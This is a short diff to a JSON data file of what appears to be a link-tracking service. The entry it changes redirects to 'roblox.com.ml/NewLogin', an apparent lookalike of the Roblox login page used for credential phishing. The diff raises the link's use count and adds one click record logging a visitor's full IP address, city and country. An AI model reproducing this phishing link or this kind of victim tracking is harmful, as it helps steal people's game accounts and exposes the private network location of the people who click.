@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 801,
+    "useCount": 802,
     "createdBy": "admin",
     "clicks": [
       {
@@ -6520,6 +6520,14 @@
         "city": "Cape Town",
         "flag": "🇿🇦",
         "countryCode": "ZA"
+      },
+      {
+        "timestamp": 1777166731448,
+        "ip": "85.245.50.102",
+        "country": "Portugal",
+        "city": "Praia da Vitória",
+        "flag": "🇵🇹",
+        "countryCode": "PT"
       }
     ]
   },
